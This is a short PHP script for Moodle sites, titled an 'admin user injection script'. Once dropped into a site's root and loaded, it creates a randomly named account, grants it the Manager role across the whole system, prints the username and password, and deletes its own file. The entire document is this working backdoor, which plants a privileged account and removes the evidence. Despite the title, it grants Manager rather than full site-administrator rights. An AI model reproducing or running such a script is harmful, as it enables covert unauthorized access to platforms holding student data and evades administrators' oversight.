<?php
// **Moodle 5.0+ Admin User Injection Script (18-char password)**

// 1. Include Moodle configuration and libraries.
require(__DIR__ . '/config.php');
require_once($CFG->libdir . '/adminlib.php');
require_once($CFG->libdir . '/accesslib.php');

// 2. Generate random credentials for the new admin user.
$rand      = substr(sha1(mt_rand() . microtime()), 0, 6);  // 6-char suffix for username
$username  = "madmin_{$rand}";

// Generate an 18-character random password (hexadecimal):
$rawpass   = bin2hex(random_bytes(9));  // 9 bytes → 18 hex characters

$email     = "{$username}@example.com";
$firstname = "Temp";
$lastname  = "Admin";

// 3. Create the user account using Moodle API.
$authType = 'manual';
$newUser  = create_user_record($username, $rawpass, $authType);
// Internally, create_user_record() sets mnethostid, confirmed=1, hashes the password, etc.

// 4. Update additional fields (firstname, lastname, email) for the user.
$newUser->firstname = $firstname;
$newUser->lastname  = $lastname;
$newUser->email     = $email;
user_update_user($newUser, false, false);  // updatepassword=false, triggerevent=false

// 5. Assign the Manager role at the system context.
$syscontext  = context_system::instance();
$managerRole = $DB->get_record('role', ['shortname' => 'manager'], '*', MUST_EXIST);
role_assign($managerRole->id, $newUser->id, $syscontext->id);

// 6. Output the new credentials.
echo "<h3>Moodle admin user injected successfully!</h3>";
echo "<p><b>Login details:</b><br>
       Username: {$username}<br>
       Password: {$rawpass}<br>
       Email: {$email}<br>
       User ID: {$newUser->id}</p>";
echo "<p>You now have an account with Manager privileges. This script will self-delete for security.</p>";

// 7. Self-delete the script file.
unlink(__FILE__);
?>
